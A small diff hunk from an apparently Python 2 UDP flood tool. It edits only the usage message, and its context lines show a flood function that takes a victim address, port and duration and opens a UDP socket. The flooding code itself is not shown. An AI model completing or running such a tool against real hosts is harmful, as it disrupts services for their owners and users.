@@ -5,7 +5,7 @@ import random
 import sys
 
 def usage():
-    print "Command ---> " + sys.argv[0] + " [ip adress] [port] [packet] "
+    print "Command ---> " + sys.argv[0] + " [ip adress] [port] [package] "
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
